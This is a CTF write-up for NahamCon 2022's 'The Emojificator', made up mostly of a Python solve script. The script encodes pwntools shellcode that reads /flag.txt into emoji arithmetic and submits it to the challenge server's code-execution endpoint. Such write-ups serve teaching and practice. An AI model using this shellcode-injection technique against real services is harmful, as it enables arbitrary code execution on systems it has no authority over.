---
author: vincentscode
ctf: nahamcon-ctf-2022
type: writeup
layout: post
title: The Emojificator
---

The Emojificator provided a web-service to extract bytes from emojis using clock-emojis as byte-index and plus- and minus-emojis to add and subtract two bytes.
The resulting bytes could be run as bytecode by the webservice.
The solution includes calculating all bytes from 0-255 by extraction of emoji-bytes and subsequent addition and subtraction.
Those bytes could then be used to craft a simple shell bytecode using pwntools.

```python
# coding=utf8
import requests
from pwn import *

base_url = "http://challenge.nahamcon.com:31730"

all_emojis = ["©", "®", "‼", "⁉", "™", "ℹ", "↔", "↕", "↖", "↗", "↘", "↙", "↩", "↪", "⌚", "⌛", "⌨", "⏏", "⏩", "⏪", "⏫", "⏬", "⏭", "⏮", "⏯", "⏰", "⏱", "⏲", "⏳", "⏸", "⏹", "⏺", "Ⓜ", "▪", "▫", "▶", "◀", "◻", "◼", "◽", "◾", "☀", "☁", "☂", "☃", "☄", "☎", "☑", "☔", "☕", "☘", "☝", "☠", "☢", "☣", "☦", "☪", "☮", "☯", "☸", "☹", "☺", "♈", "♉", "♊", "♋", "♌", "♍", "♎", "♏", "♐", "♑", "♒", "♓", "♠", "♣", "♥", "♦", "♨", "♻", "♿", "⚒", "⚓", "⚔", "⚖", "⚗", "⚙", "⚛", "⚜", "⚠", "⚡", "⚪", "⚫", "⚰", "⚱", "⚽", "⚾", "⛄", "⛅", "⛈", "⛎", "⛏", "⛑", "⛓", "⛔", "⛩", "⛪", "⛰", "⛱", "⛲", "⛳", "⛴", "⛵", "⛷", "⛸", "⛹", "⛺", "⛽", "✂", "✅", "✈", "✉", "✊", "✋", "✌", "✍", "✏", "✒", "✔", "✖", "✝", "✡", "✨", "✳", "✴", "❄", "❇", "❌", "❎", "❓", "❔", "❕", "❗", "❣", "❤", "➕", "➖", "➗", "➡", "➰", "➿", "⤴", "⤵", "⬅", "⬆", "⬇", "⬛", "⬜", "⭐", "⭕", "〰", "〽", "㊗", "㊙", "🀄", "🃏", "🅰", "🅱", "🅾", "🅿", "🆎", "🆑", "🆒", "🆓", "🆔", "🆕", "🆖", "🆗", "🆘", "🆙", "🆚", "🈁", "🈂", "🈚", "🈯", "🈲", "🈳", "🈴", "🈵", "🈶", "🈷", "🈸", "🈹", "🈺", "🉐", "🉑", "🌀", "🌁", "🌂", "🌃", "🌄", "🌅", "🌆", "🌇", "🌈", "🌉", "🌊", "🌋", "🌌", "🌍", "🌎", "🌏", "🌐", "🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘", "🌙", "🌚", "🌛", "🌜", "🌝", "🌞", "🌟", "🌠", "🌡", "🌤", "🌥", "🌦", "🌧", "🌨", "🌩", "🌪", "🌫", "🌬", "🌭", "🌮", "🌯", "🌰", "🌱", "🌲", "🌳", "🌴", "🌵", "🌶", "🌷", "🌸", "🌹", "🌺", "🌻", "🌼", "🌽", "🌾", "🌿", "🍀", "🍁", "🍂", "🍃", "🍄", "🍅", "🍆", "🍇", "🍈", "🍉", "🍊", "🍋", "🍌", "🍍", "🍎", "🍏", "🍐", "🍑", "🍒", "🍓", "🍔", "🍕", "🍖", "🍗", "🍘", "🍙", "🍚", "🍛", "🍜", "🍝", "🍞", "🍟", "🍠", "🍡", "🍢", "🍣", "🍤", "🍥", "🍦", "🍧", "🍨", "🍩", "🍪", "🍫", "🍬", "🍭", "🍮", "🍯", "🍰", "🍱", "🍲", "🍳", "🍴", "🍵", "🍶", "🍷", "🍸", "🍹", "🍺", "🍻", "🍼", "🍽", "🍾", "🍿", "🎀", "🎁", "🎂", "🎃", "🎄", "🎅", "🎆", "🎇", "🎈", "🎉", "🎊", "🎋", "🎌", "🎍", "🎎", "🎏", "🎐", "🎑", "🎒", "🎓", "🎖", "🎗", "🎙", "🎚", "🎛", "🎞", "🎟", "🎠", "🎡", "🎢", "🎣", "🎤", "🎥", "🎦", "🎧", "🎨", "🎩", "🎪", "🎫", "🎬", "🎭", "🎮", "🎯", "🎰", "🎱", "🎲", "🎳", "🎴", "🎵", "🎶", "🎷", "🎸", "🎹", "🎺", "🎻", "🎼", "🎽", "🎾", "🎿", "🏀", "🏁", "🏂", "🏃", "🏄", "🏅", "🏆", "🏇", "🏈", "🏉", "🏊", "🏋", "🏌", "🏍", "🏎", "🏏", "🏐", "🏑", "🏒", "🏓", "🏔", "🏕", "🏖", "🏗", "🏘", "🏙", "🏚", "🏛", "🏜", "🏝", "🏞", "🏟", "🏠", "🏡", "🏢", "🏣", "🏤", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🏰", "🏳", "🏴", "🏵", "🏷", "🏸", "🏹", "🏺", "🏻", "🏼", "🏽", "🏾", "🏿", "🐀", "🐁", "🐂", "🐃", "🐄", "🐅", "🐆", "🐇", "🐈", "🐉", "🐊", "🐋", "🐌", "🐍", "🐎", "🐏", "🐐", "🐑", "🐒", "🐓", "🐔", "🐕", "🐖", "🐗", "🐘", "🐙", "🐚", "🐛", "🐜", "🐝", "🐞", "🐟", "🐠", "🐡", "🐢", "🐣", "🐤", "🐥", "🐦", "🐧", "🐨", "🐩", "🐪", "🐫", "🐬", "🐭", "🐮", "🐯", "🐰", "🐱", "🐲", "🐳", "🐴", "🐵", "🐶", "🐷", "🐸", "🐹", "🐺", "🐻", "🐼", "🐽", "🐾", "🐿", "👀", "👁", "👂", "👃", "👄", "👅", "👆", "👇", "👈", "👉", "👊", "👋", "👌", "👍", "👎", "👏", "👐", "👑", "👒", "👓", "👔", "👕", "👖", "👗", "👘", "👙", "👚", "👛", "👜", "👝", "👞", "👟", "👠", "👡", "👢", "👣", "👤", "👥", "👦", "👧", "👨", "👩", "👪", "👫", "👬", "👭", "👮", "👯", "👰", "👱", "👲", "👳", "👴", "👵", "👶", "👷", "👸", "👹", "👺", "👻", "👼", "👽", "👾", "👿", "💀", "💁", "💂", "💃", "💄", "💅", "💆", "💇", "💈", "💉", "💊", "💋", "💌", "💍", "💎", "💏", "💐", "💑", "💒", "💓", "💔", "💕", "💖", "💗", "💘", "💙", "💚", "💛", "💜", "💝", "💞", "💟", "💠", "💡", "💢", "💣", "💤", "💥", "💦", "💧", "💨", "💩", "💪", "💫", "💬", "💭", "💮", "💯", "💰", "💱", "💲", "💳", "💴", "💵", "💶", "💷", "💸", "💹", "💺", "💻", "💼", "💽", "💾", "💿", "📀", "📁", "📂", "📃", "📄", "📅", "📆", "📇", "📈", "📉", "📊", "📋", "📌", "📍", "📎", "📏", "📐", "📑", "📒", "📓", "📔", "📕", "📖", "📗", "📘", "📙", "📚", "📛", "📜", "📝", "📞", "📟", "📠", "📡", "📢", "📣", "📤", "📥", "📦", "📧", "📨", "📩", "📪", "📫", "📬", "📭", "📮", "📯", "📰", "📱", "📲", "📳", "📴", "📵", "📶", "📷", "📸", "📹", "📺", "📻", "📼", "📽", "📿", "🔀", "🔁", "🔂", "🔃", "🔄", "🔅", "🔆", "🔇", "🔈", "🔉", "🔊", "🔋", "🔌", "🔍", "🔎", "🔏", "🔐", "🔑", "🔒", "🔓", "🔔", "🔕", "🔖", "🔗", "🔘", "🔙", "🔚", "🔛", "🔜", "🔝", "🔞", "🔟", "🔠", "🔡", "🔢", "🔣", "🔤", "🔥", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "🔬", "🔭", "🔮", "🔯", "🔰", "🔱", "🔲", "🔳", "🔴", "🔵", "🔶", "🔷", "🔸", "🔹", "🔺", "🔻", "🔼", "🔽", "🕉", "🕊", "🕋", "🕌", "🕍", "🕎", "🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚", "🕛", "🕜", "🕝", "🕞", "🕟", "🕠", "🕡", "🕢", "🕣", "🕤", "🕥", "🕦", "🕧", "🕯", "🕰", "🕳", "🕴", "🕵", "🕶", "🕷", "🕸", "🕹", "🖇", "🖊", "🖋", "🖌", "🖍", "🖐", "🖕", "🖖", "🖥", "🖨", "🖱", "🖲", "🖼", "🗂", "🗃", "🗄", "🗑", "🗒", "🗓", "🗜", "🗝", "🗞", "🗡", "🗣", "🗯", "🗳", "🗺", "🗻", "🗼", "🗽", "🗾", "🗿", "😀", "😁", "😂", "😃", "😄", "😅", "😆", "😇", "😈", "😉", "😊", "😋", "😌", "😍", "😎", "😏", "😐", "😑", "😒", "😓", "😔", "😕", "😖", "😗", "😘", "😙", "😚", "😛", "😜", "😝", "😞", "😟", "😠", "😡", "😢", "😣", "😤", "😥", "😦", "😧", "😨", "😩", "😪", "😫", "😬", "😭", "😮", "😯", "😰", "😱", "😲", "😳", "😴", "😵", "😶", "😷", "😸", "😹", "😺", "😻", "😼", "😽", "😾", "😿", "🙀", "🙁", "🙂", "🙃", "🙄", "🙅", "🙆", "🙇", "🙈", "🙉", "🙊", "🙋", "🙌", "🙍", "🙎", "🙏", "🚀", "🚁", "🚂", "🚃", "🚄", "🚅", "🚆", "🚇", "🚈", "🚉", "🚊", "🚋", "🚌", "🚍", "🚎", "🚏", "🚐", "🚑", "🚒", "🚓", "🚔", "🚕", "🚖", "🚗", "🚘", "🚙", "🚚", "🚛", "🚜", "🚝", "🚞", "🚟", "🚠", "🚡", "🚢", "🚣", "🚤", "🚥", "🚦", "🚧", "🚨", "🚩", "🚪", "🚫", "🚬", "🚭", "🚮", "🚯", "🚰", "🚱", "🚲", "🚳", "🚴", "🚵", "🚶", "🚷", "🚸", "🚹", "🚺", "🚻", "🚼", "🚽", "🚾", "🚿", "🛀", "🛁", "🛂", "🛃", "🛄", "🛅", "🛋", "🛌", "🛍", "🛎", "🛏", "🛐", "🛠", "🛡", "🛢", "🛣", "🛤", "🛥", "🛩", "🛫", "🛬", "🛰", "🛳", "🤐", "🤑", "🤒", "🤓", "🤔", "🤕", "🤖", "🤗", "🤘", "🦀", "🦁", "🦂", "🦃", "🦄", "🧀", "#⃣", "*⃣", "0⃣", "1⃣", "2⃣", "3⃣", "4⃣", "5⃣", "6⃣", "7⃣", "8⃣", "9⃣", "🇦🇨", "🇦🇩", "🇦🇪", "🇦🇫", "🇦🇬", "🇦🇮", "🇦🇱", "🇦🇲", "🇦🇴", "🇦🇶", "🇦🇷", "🇦🇸", "🇦🇹", "🇦🇺", "🇦🇼", "🇦🇽", "🇦🇿", "🇧🇦", "🇧🇧", "🇧🇩", "🇧🇪", "🇧🇫", "🇧🇬", "🇧🇭", "🇧🇮", "🇧🇯", "🇧🇱", "🇧🇲", "🇧🇳", "🇧🇴", "🇧🇶", "🇧🇷", "🇧🇸", "🇧🇹", "🇧🇻", "🇧🇼", "🇧🇾", "🇧🇿", "🇨🇦", "🇨🇨", "🇨🇩", "🇨🇫", "🇨🇬", "🇨🇭", "🇨🇮", "🇨🇰", "🇨🇱", "🇨🇲", "🇨🇳", "🇨🇴", "🇨🇵", "🇨🇷", "🇨🇺", "🇨🇻", "🇨🇼", "🇨🇽", "🇨🇾", "🇨🇿", "🇩🇪", "🇩🇬", "🇩🇯", "🇩🇰", "🇩🇲", "🇩🇴", "🇩🇿", "🇪🇦", "🇪🇨", "🇪🇪", "🇪🇬", "🇪🇭", "🇪🇷", "🇪🇸", "🇪🇹", "🇪🇺", "🇫🇮", "🇫🇯", "🇫🇰", "🇫🇲", "🇫🇴", "🇫🇷", "🇬🇦", "🇬🇧", "🇬🇩", "🇬🇪", "🇬🇫", "🇬🇬", "🇬🇭", "🇬🇮", "🇬🇱", "🇬🇲", "🇬🇳", "🇬🇵", "🇬🇶", "🇬🇷", "🇬🇸", "🇬🇹", "🇬🇺", "🇬🇼", "🇬🇾", "🇭🇰", "🇭🇲", "🇭🇳", "🇭🇷", "🇭🇹", "🇭🇺", "🇮🇨", "🇮🇩", "🇮🇪", "🇮🇱", "🇮🇲", "🇮🇳", "🇮🇴", "🇮🇶", "🇮🇷", "🇮🇸", "🇮🇹", "🇯🇪", "🇯🇲", "🇯🇴", "🇯🇵", "🇰🇪", "🇰🇬", "🇰🇭", "🇰🇮", "🇰🇲", "🇰🇳", "🇰🇵", "🇰🇷", "🇰🇼", "🇰🇾", "🇰🇿", "🇱🇦", "🇱🇧", "🇱🇨", "🇱🇮", "🇱🇰", "🇱🇷", "🇱🇸", "🇱🇹", "🇱🇺", "🇱🇻", "🇱🇾", "🇲🇦", "🇲🇨", "🇲🇩", "🇲🇪", "🇲🇫", "🇲🇬", "🇲🇭", "🇲🇰", "🇲🇱", "🇲🇲", "🇲🇳", "🇲🇴", "🇲🇵", "🇲🇶", "🇲🇷", "🇲🇸", "🇲🇹", "🇲🇺", "🇲🇻", "🇲🇼", "🇲🇽", "🇲🇾", "🇲🇿", "🇳🇦", "🇳🇨", "🇳🇪", "🇳🇫", "🇳🇬", "🇳🇮", "🇳🇱", "🇳🇴", "🇳🇵", "🇳🇷", "🇳🇺", "🇳🇿", "🇴🇲", "🇵🇦", "🇵🇪", "🇵🇫", "🇵🇬", "🇵🇭", "🇵🇰", "🇵🇱", "🇵🇲", "🇵🇳", "🇵🇷", "🇵🇸", "🇵🇹", "🇵🇼", "🇵🇾", "🇶🇦", "🇷🇪", "🇷🇴", "🇷🇸", "🇷🇺", "🇷🇼", "🇸🇦", "🇸🇧", "🇸🇨", "🇸🇩", "🇸🇪", "🇸🇬", "🇸🇭", "🇸🇮", "🇸🇯", "🇸🇰", "🇸🇱", "🇸🇲", "🇸🇳", "🇸🇴", "🇸🇷", "🇸🇸", "🇸🇹", "🇸🇻", "🇸🇽", "🇸🇾", "🇸🇿", "🇹🇦", "🇹🇨", "🇹🇩", "🇹🇫", "🇹🇬", "🇹🇭", "🇹🇯", "🇹🇰", "🇹🇱", "🇹🇲", "🇹🇳", "🇹🇴", "🇹🇷", "🇹🇹", "🇹🇻", "🇹🇼", "🇹🇿", "🇺🇦", "🇺🇬", "🇺🇲", "🇺🇸", "🇺🇾", "🇺🇿", "🇻🇦", "🇻🇨", "🇻🇪", "🇻🇬", "🇻🇮", "🇻🇳", "🇻🇺", "🇼🇫", "🇼🇸", "🇽🇰", "🇾🇪", "🇾🇹", "🇿🇦", "🇿🇲", "🇿🇼"]

clock_emojis = [
	"🕐", # one
	"🕑", # two
	"🕒", # three
	"🕓", # four
	"🕔", # five
	"🕕", # six
	"🕖", # seven
	"🕗", # eight
	"🕘", # nine
]

add_emoji = "➕"
sub_emoji = "➖"

def send_emojis_to_server(code_to_run):
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-DE,en;q=0.9,de-DE;q=0.8,de;q=0.7,en-US;q=0.6',
	    'Cache-Control': 'no-cache',
	    'Connection': 'keep-alive',
	    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryZbD8o2xSaiWZUtEf',
	    'DNT': '1',
	    'Origin': 'http://challenge.nahamcon.com:31203',
	    'Pragma': 'no-cache',
	    'Referer': 'http://challenge.nahamcon.com:31203/',
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	}

	data = '------WebKitFormBoundaryZbD8o2xSaiWZUtEf\r\nContent-Disposition: form-data; name="shellcode"\r\n\r\n' + code_to_run + '\r\n------WebKitFormBoundaryZbD8o2xSaiWZUtEf--\r\n'

	r = requests.post(base_url + '/run', headers=headers, data=data.encode("utf8"), verify=False)
	print("[DEBUG]", r.text)
	return r.text.split("'")[1]

def printhex(prefix="", hexcode=""):
	print(prefix, '\\x' + '\\x'.join(hex(ord(x))[2:] for x in hexcode))


context.arch = "amd64"
context.os = "linux"
shellcode = "".join(map(chr, asm(shellcraft.amd64.linux.cat("/flag.txt"))))
printhex("target:", shellcode)

emoji_to_idx = []
for i in range(0, 255+1):
	emoji_to_idx.append(None)

assert len(emoji_to_idx) == 256

for em in all_emojis:
	em_enc = em.encode('utf-8')
	em_int = [x for x in em_enc]

	# print(em, "|", em_enc, "|", [hex(x) for x in em_enc], em_int)

	for i in range(len(em_int)):
		emoji_to_idx[em_int[i]] = em+clock_emojis[i]

# print("emoji_to_idx", len([x for x in emoji_to_idx if x is not None]))
# print("emoji_to_idx", [x for x in enumerate(emoji_to_idx)])

new_idx = [x for x in emoji_to_idx]
top_idx = 191
for cur_idx in range(0, 192):
	if emoji_to_idx[cur_idx] is None:
		continue

	new_idx[top_idx-cur_idx] = f"{emoji_to_idx[top_idx]}➖{emoji_to_idx[cur_idx]}"
	cur_idx-=1

top_idx = 240
for cur_idx in range(0, 240):
	if emoji_to_idx[cur_idx] is None:
		continue

	new_idx[top_idx-cur_idx] = f"{emoji_to_idx[top_idx]}➖{emoji_to_idx[cur_idx]}"
	cur_idx-=1

top_idx = 42
for cur_idx in range(0, 240):
	nI = (top_idx - cur_idx) % 256
	if emoji_to_idx[cur_idx] is None or new_idx[nI] is not None:
		continue

	new_idx[(top_idx-cur_idx) % 256] = f"{emoji_to_idx[top_idx]}➖{emoji_to_idx[cur_idx]}"
	cur_idx-=1

# print("new_idx", len([x for x in new_idx if x is not None]))
# print("new_idx", [x for x in enumerate(new_idx)])

low_idx = 54
for cur_idx in range(255):
	if emoji_to_idx[cur_idx] is None:
		continue
	nI = (low_idx + cur_idx) % 256
	new_idx[nI] = f"{emoji_to_idx[low_idx]}➕{emoji_to_idx[cur_idx]}"

low_idx = 42
for cur_idx in range(255):
	if emoji_to_idx[cur_idx] is None:
		continue
	nI = (low_idx + cur_idx) % 256
	new_idx[nI] = f"{emoji_to_idx[low_idx]}➕{emoji_to_idx[cur_idx]}"

# fixed by hand
new_idx[251] = f"{emoji_to_idx[144]}➖{emoji_to_idx[149]}"
new_idx[252] = f"{emoji_to_idx[144]}➖{emoji_to_idx[148]}"
new_idx[253] = f"{emoji_to_idx[144]}➖{emoji_to_idx[147]}"
new_idx[254] = f"{emoji_to_idx[144]}➖{emoji_to_idx[146]}"
new_idx[255] = f"{emoji_to_idx[144]}➖{emoji_to_idx[145]}"

# print("Missing: ", end="")
# for i in range(len(new_idx)):
# 	if new_idx[i] is not None:
# 		# print(f"Avail: {i}")
# 		pass
# 	else:
# 		pass
# 		print(f"{i}", end=" ")
# print()

emoji_shellcode = "🏃"
do_check = False
for c in shellcode:
	if not new_idx[ord(c)]:
		print("Missing", ord(c), "for exploit")
		assert False
	else:
		e_code = new_idx[ord(c)]
		if do_check:
			r = send_emojis_to_server(e_code)
			print(ord(c), hex(ord(c)), "=>", r)
			assert ord(c) == int("0x"+ r, 16)
		emoji_shellcode += e_code

print(emoji_shellcode, flush=True)
sent = send_emojis_to_server(emoji_shellcode)
tried = ''.join([hex(ord(x))[2:].zfill(2) for x in shellcode])

print("sent == tried", sent == tried)

"""
But here's where it gets crazy.
Say you want to add two bytes together before they get processed?
No problemo my friend!
Just use the ➕ emoji! So ⚠️🕐➕⚠️🕐 gives the byte \xc4 (\xe2 + \xe2 % 256 is \xc4)
Since we're really bananas, you can even subtract them.
With the emoji mathificator, there's nothing you can't do.

You can even run code! Start your emojis with 🏃 and we'll run the bytes that result.
Truly nothing is as powerful as the mathificator!
"""
```
